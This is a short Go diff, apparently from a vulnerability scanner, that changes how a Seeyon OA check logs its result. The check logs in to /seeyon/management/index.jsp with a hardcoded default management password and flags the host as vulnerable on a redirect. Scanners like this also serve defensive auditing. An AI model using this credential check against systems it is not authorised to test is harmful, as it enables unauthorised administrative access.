@@ -11,7 +11,7 @@ import (
 func ManagementStatus(u string) bool {
 	if req, err := pkg.HttpRequset(u+"/seeyon/management/index.jsp", "POST", "password=WLCCYBD@SEEYON", false, nil); err == nil {
 		if req.StatusCode == 302 && strings.Contains(req.Location, "status") {
-			fmt.Printf("[+] Found vuln seeyon ManagementStatus|pssword:WLCCYBD@SEEYON|%s\n", u+"/seeyon/management/index.jsp")
+			pkg.POClog(fmt.Sprintf("Found vuln seeyon ManagementStatus|pssword:WLCCYBD@SEEYON|%s\n", u+"/seeyon/management/index.jsp"))
 			return true
 		}
 	}
